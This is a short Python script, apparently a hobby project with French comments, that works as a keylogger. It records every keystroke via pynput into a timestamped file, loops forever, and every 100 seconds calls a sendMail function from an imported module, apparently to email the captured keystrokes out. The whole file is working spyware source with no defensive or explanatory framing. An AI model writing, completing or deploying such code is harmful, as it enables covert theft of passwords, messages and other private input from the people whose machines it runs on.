import logging
from threading import Timer
from testSendMail import *
from pynput.keyboard import Key, Listener

logging.basicConfig(filename=("keylogs.txt"),filemode="w",
                        datefmt='%d/%m/%Y %I:%M:%S %p',format='%(asctime)s:%(message)s',level=logging.DEBUG)


def on_press(key):
    logging.info(str(key))



while True:
    with Listener(on_press=on_press) as listener:
        Timer(100, listener.stop).start()
        listener.join()

    print("Commence à envoyer le mail") # A enlever plus tard
    sendMail()


